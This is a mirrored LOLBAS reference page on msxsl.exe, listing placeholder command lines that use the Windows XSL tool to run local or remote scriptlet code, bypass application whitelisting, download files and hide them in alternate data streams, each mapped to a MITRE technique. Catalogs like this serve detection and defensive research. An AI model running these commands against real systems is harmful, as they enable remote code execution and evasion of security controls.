# LOLBAS: msxsl.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `ADS`, `AWL Bypass`, `Download`, `Execute`

Command line utility used to perform XSL transformations.

## Comandos

### Local execution of script stored in XSL file.

Execute · priv: User · T1220

```cmd
msxsl.exe {PATH:.xml} {PATH:.xsl}
```

Run COM Scriptlet code within the script.xsl file (local).

### Local execution of script stored in XSL file.

AWL Bypass · priv: User · T1220

```cmd
msxsl.exe {PATH:.xml} {PATH:.xsl}
```

Run COM Scriptlet code within the script.xsl file (local).

### Local execution of remote script stored in XSL script stored as an XML file.

Execute · priv: User · T1220

```cmd
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}
```

Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).

### Local execution of remote script stored in XSL script stored as an XML file.

AWL Bypass · priv: User · T1220

```cmd
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}
```

Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).

### Download a file from the internet and save it to disk.

Download · priv: User · T1105

```cmd
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}
```

Using remote XML and XSL files, save the transformed XML file to disk.

### Download a file from the internet and save it to an NTFS Alternate Data Stream.

ADS · priv: User · T1564

```cmd
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name
```

Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS).

